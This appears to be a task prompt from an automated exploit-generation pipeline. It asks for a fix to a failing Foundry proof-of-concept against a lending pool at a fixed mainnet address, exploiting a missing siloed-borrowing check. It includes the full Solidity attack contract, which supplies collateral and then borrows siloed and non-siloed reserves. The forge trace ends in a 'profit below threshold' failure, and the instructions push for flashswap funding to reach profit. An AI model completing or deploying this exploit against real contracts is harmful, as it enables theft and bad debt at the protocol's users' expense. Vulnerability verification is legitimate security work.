You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Siloed-borrowing risk controls are defined but never enforced on borrow
- claim: The protocol includes silo-borrowing state helpers (`getSiloedBorrowingState`, `getSiloedBorrowing`) and an explicit `SILOED_BORROWING_VIOLATION` error, but `BorrowLogic.executeBorrow()` delegates to `ValidationLogic.validateBorrow()` and that validation never checks either the requested reserve's silo flag or the user's existing siloed-borrowing state. As a result, borrowing a siloed reserve does not prevent additional borrows, and existing borrows do not prevent borrowing a siloed reserve.
- impact: If governance lists any reserve expecting isolated exposure, borrowers can still combine it with other debts. That defeats the intended risk model for siloed assets and can convert isolated risk into cross-reserve bad debt and insolvency during adverse price moves.
- exploit_paths: ["borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike {
    function deposit() external payable;
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
    function getWETH() external view returns (address);
}

struct ReserveConfigurationMap {
    uint256 data;
}

interface IParaSpacePoolLike {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint16 referralCode, address onBehalfOf) external;
    function repay(address asset, uint256 amount, address onBehalfOf) external returns (uint256);
    function getReservesList() external view returns (address[] memory);
    function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
    function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderLike);

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor,
            uint256 erc721HealthFactor
        );
}

contract FlawVerifier {
    address public constant TARGET = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;

    uint16 private constant REFERRAL_CODE = 0;
    uint256 private constant BPS = 10_000;
    uint256 private constant ACTIVE_SHIFT = 56;
    uint256 private constant FROZEN_SHIFT = 57;
    uint256 private constant BORROWING_SHIFT = 58;
    uint256 private constant PAUSED_SHIFT = 60;
    uint256 private constant SILO_SHIFT = 62;
    uint256 private constant ASSET_TYPE_SHIFT = 168;

    bool public attempted;
    bool public hypothesisValidated;

    address private _profitToken;
    uint256 private _profitAmount;

    address private _otherAsset;
    uint256 private _otherPrice;
    uint256 private _otherUnit;

    address private _siloAsset;
    uint256 private _siloPrice;
    uint256 private _siloUnit;

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        IParaSpacePoolLike pool = IParaSpacePoolLike(TARGET);
        IPoolAddressesProviderLike provider = pool.ADDRESSES_PROVIDER();
        IPriceOracleLike oracle = IPriceOracleLike(provider.getPriceOracle());

        _wrapNative(provider.getWETH());
        _clearScratch();

        address collateral = _supplyBestCollateral(pool, oracle);
        if (collateral == address(0)) {
            // The missing check only impacts borrow-side isolation. Without verifier-held
            // collateral, ordinary collateral/LTV validation still prevents any borrow.
            return;
        }

        if (!_findAndProbe(pool, oracle, collateral, false, _availableBorrowsBase(pool) / 20)) {
            return;
        }

        if (!_findAndProbe(pool, oracle, collateral, true, _availableBorrowsBase(pool) / 20)) {
            _repayAll(pool, _otherAsset);
            return;
        }

        // Direction 1:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // Existing non-silo debt does not block borrowing a siloed reserve.
        _repayAll(pool, _otherAsset);
        _repayAll(pool, _siloAsset);

        uint256 beforeSilo = _balanceOf(_siloAsset);
        uint256 beforeOther = _balanceOf(_otherAsset);

        if (_attemptBorrow(_siloAsset, _siloPrice, _siloUnit, (_availableBorrowsBase(pool) * 45) / 100) == 0) {
            return;
        }

        // Direction 2:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // A siloed borrow does not block a later non-silo borrow.
        if (_attemptBorrow(_otherAsset, _otherPrice, _otherUnit, (_availableBorrowsBase(pool) * 90) / 100) == 0) {
            _repayAll(pool, _siloAsset);
            return;
        }

        hypothesisValidated = true;

        uint256 siloProfit = _balanceOf(_siloAsset) - beforeSilo;
        uint256 otherProfit = _balanceOf(_otherAsset) - beforeOther;
        if (otherProfit >= siloProfit) {
            _profitToken = _otherAsset;
            _profitAmount = otherProfit;
        } else {
            _profitToken = _siloAsset;
            _profitAmount = siloProfit;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _clearScratch() internal {
        _otherAsset = address(0);
        _otherPrice = 0;
        _otherUnit = 0;
        _siloAsset = address(0);
        _siloPrice = 0;
        _siloUnit = 0;
    }

    function _supplyBestCollateral(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle
    ) internal returns (address bestAsset) {
        address[] memory reserves = pool.getReservesList();
        uint256 bestValue;

        for (uint256 i = 0; i < reserves.length; i++) {
            address asset = reserves[i];
            if (asset == address(0) || asset.code.length == 0) {
                continue;
            }

            uint256 data = pool.getConfiguration(asset).data;
            if (!_collateralEnabled(data)) {
                continue;
            }

            uint256 unit = _unit(uint8((data >> 48) & 0xff));
            if (unit == 0) {
                continue;
            }

            uint256 price = oracle.getAssetPrice(asset);
            if (price == 0) {
                continue;
            }

            uint256 balance = _balanceOf(asset);
            if (balance == 0) {
                continue;
            }

            uint256 valueBase = (balance * price) / unit;
            if (valueBase > bestValue) {
                bestValue = valueBase;
                bestAsset = asset;
            }
        }

        if (bestAsset == address(0)) {
            return address(0);
        }

        uint256 amount = _balanceOf(bestAsset);
        if (amount == 0) {
            return address(0);
        }

        _forceApprove(bestAsset, TARGET, amount);
        pool.supply(bestAsset, amount, address(this), REFERRAL_CODE);
    }

    function _findAndProbe(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address excludedAsset,
        bool wantSiloed,
        uint256 desiredBase
    ) internal returns (bool) {
        if (_findAndProbeInternal(pool, oracle, excludedAsset, wantSiloed, desiredBase)) {
            return true;
        }
        return _findAndProbeInternal(pool, oracle, address(0), wantSiloed, desiredBase);
    }

    function _findAndProbeInternal(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address excludedAsset,
        bool wantSiloed,
        uint256 desiredBase
    ) internal returns (bool) {
        address[] memory reserves = pool.getReservesList();

        for (uint256 i = 0; i < reserves.length; i++) {
            address asset = reserves[i];
            if (asset == excludedAsset || asset == address(0) || asset.code.length == 0) {
                continue;
            }

            uint256 data = pool.getConfiguration(asset).data;
            if (!_borrowEnabled(data, wantSiloed)) {
                continue;
            }

            uint256 unit = _unit(uint8((data >> 48) & 0xff));
            if (unit == 0) {
                continue;
            }

            uint256 price = oracle.getAssetPrice(asset);
            if (price == 0) {
                continue;
            }

            uint256 amount = _attemptBorrow(asset, price, unit, desiredBase);
            if (amount == 0) {
                continue;
            }

            if (wantSiloed) {
                _siloAsset = asset;
                _siloPrice = price;
                _siloUnit = unit;
            } else {
                _otherAsset = asset;
                _otherPrice = price;
                _otherUnit = unit;
            }
            return true;
        }

        return false;
    }

    function _attemptBorrow(
        address asset,
        uint256 price,
        uint256 unit,
        uint256 desiredBase
    ) internal returns (uint256 amount) {
        if (asset == address(0) || price == 0 || unit == 0 || desiredBase == 0) {
            return 0;
        }

        amount = _attemptBorrowScaled(asset, price, unit, desiredBase, BPS);
        if (amount != 0) return amount;
        amount = _attemptBorrowScaled(asset, price, unit, desiredBase, 7_500);
        if (amount != 0) return amount;
        amount = _attemptBorrowScaled(asset, price, unit, desiredBase, 5_000);
        if (amount != 0) return amount;
        amount = _attemptBorrowScaled(asset, price, unit, desiredBase, 2_500);
        if (amount != 0) return amount;
        amount = _attemptBorrowScaled(asset, price, unit, desiredBase, 1_000);
        if (amount != 0) return amount;
        amount = _attemptBorrowScaled(asset, price, unit, desiredBase, 250);
        if (amount != 0) return amount;
        return _attemptBorrowScaled(asset, price, unit, desiredBase, 100);
    }

    function _attemptBorrowScaled(
        address asset,
        uint256 price,
        uint256 unit,
        uint256 desiredBase,
        uint256 scale
    ) internal returns (uint256 amount) {
        amount = _quote(unit, price, (desiredBase * scale) / BPS);
        if (amount == 0) {
            return 0;
        }

        // The verifier proves the claim through the exact public path:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        try IParaSpacePoolLike(TARGET).borrow(asset, amount, REFERRAL_CODE, address(this)) {
            return amount;
        } catch {
            return 0;
        }
    }

    function _repayAll(IParaSpacePoolLike pool, address asset) internal {
        uint256 balance = _balanceOf(asset);
        if (balance == 0) {
            return;
        }

        _forceApprove(asset, TARGET, type(uint256).max);
        pool.repay(asset, type(uint256).max, address(this));
    }

    function _balanceOf(address token) internal view returns (uint256 amount) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        try IERC20Like(token).balanceOf(address(this)) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _approve(token, spender, 0);
        _approve(token, spender, amount);
    }

    function _approve(address token, address spender, uint256 amount) internal {
        try IERC20Like(token).approve(spender, amount) returns (bool ok) {
            require(ok, "token-call-false");
        } catch {
            revert("token-call-failed");
        }
    }

    function _availableBorrowsBase(IParaSpacePoolLike pool) internal view returns (uint256 availableBorrowsBase) {
        (, , availableBorrowsBase, , , , ) = pool.getUserAccountData(address(this));
    }

    function _quote(uint256 unit, uint256 price, uint256 baseBudget) internal pure returns (uint256 amount) {
        if (unit == 0 || price == 0 || baseBudget == 0) {
            return 0;
        }

        amount = (baseBudget * unit) / price;
        if (amount == 0) {
            amount = 1;
        }
    }

    function _unit(uint8 decimals) internal pure returns (uint256) {
        if (decimals > 77) {
            return 0;
        }
        return 10 ** decimals;
    }

    function _collateralEnabled(uint256 data) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            (data & 0xffff) != 0;
    }

    function _borrowEnabled(uint256 data, bool wantSiloed) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> BORROWING_SHIFT) & 1) != 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            (((data >> SILO_SHIFT) & 1) != 0) == wantSiloed;
    }

    function _wrapNative(address weth) internal {
        if (weth == address(0) || weth.code.length == 0 || address(this).balance == 0) {
            return;
        }
        IWETHLike(weth).deposit{value: address(this).balance}();
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
   ├─ [20311] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704) [staticcall]
    │   │   ├─ [14637] 0xF017fcB346A1885194689bA23Eff2fE6fA5C483b::50d25bcd() [staticcall]
    │   │   │   ├─ [7141] 0xd74FF3f1b565597E59D44320F53a5C5c8BA85f7b::50d25bcd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e1bf2ca0bde5bec
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e1bf2ca0bde5bec
    │   │   └─ ← [Return] 1016673090498616300 [1.016e18]
    │   ├─ [9726] 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2529] 0x31724cA0C982A31fbb5C57f4217AB585271fc9a5::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0xae78736Cd615f374D3085123A210448E74Fc6393) [staticcall]
    │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xae78736Cd615f374D3085123A210448E74Fc6393) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 1661534994755323375969160883030570310688 [1.661e39] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 1661534994755323375969160883030570310688 [1.661e39] })
    │   ├─ [26905] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(0xae78736Cd615f374D3085123A210448E74Fc6393) [staticcall]
    │   │   ├─ [21231] 0xFCbf6B66dED63D6a8231dB091c16a3481d2E8890::50d25bcd() [staticcall]
    │   │   │   ├─ [20591] 0xae78736Cd615f374D3085123A210448E74Fc6393::e6aa216c() [staticcall]
    │   │   │   │   ├─ [2473] 0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46::21f8a721(7630e125f1c009e5fc974f6dae77c6d5b1802979b36e6d7145463c21782af01e) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000138313f102ce9a0662f826fca977e3ab4d6e5539
    │   │   │   │   ├─ [5326] 0x138313f102cE9a0662F826fCA977E3ab4D6e5539::964d042c() [staticcall]
    │   │   │   │   │   ├─ [2473] 0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46::bd02d0f5(9dc185b46ed0f11d151f055e45fde635375a9680c34e501b43a82eb6c09c0951) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000030013175bbd06c98ee09
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000030013175bbd06c98ee09
    │   │   │   │   ├─ [3347] 0x138313f102cE9a0662F826fCA977E3ab4D6e5539::c4c8d0ad() [staticcall]
    │   │   │   │   │   ├─ [2473] 0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46::bd02d0f5(5b3a7b8bdde2122fad4dc45e51ae0c5cedc887473a999474f2ead5a8faadfe3c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000002d2b36be4a5559c309a1
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000002d2b36be4a5559c309a1
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000ebfc3fcec21a3c9
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000ebfc3fcec21a3c9
    │   │   └─ ← [Return] 1062783528143528905 [1.062e18]
    │   ├─ [2486] 0xae78736Cd615f374D3085123A210448E74Fc6393::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [delegatecall]
    │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447106658577248951328 [1.844e22] })
    │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447106658577248951328 [1.844e22] })
    │   ├─ [20266] 0x6B58baa08a91f0F08900f43692a9796045454A17::getAssetPrice(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   ├─ [14592] 0xdeb288F737066589598e9214E782fa5A8eD689e8::50d25bcd() [staticcall]
    │   │   │   ├─ [7096] 0x81076d6Ff2620Ea9Dd7bA9c1015f0d09A3A732E6::50d25bcd() [staticcall]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000cff5e2f2ee4a4040
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000cff5e2f2ee4a4040
    │   │   └─ ← [Return] 14985132868153000000 [1.498e19]
    │   ├─ [2795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [324] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2314] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 56.05s (56.01s CPU time)

Ran 1 test suite in 56.07s (56.05s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 815662)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
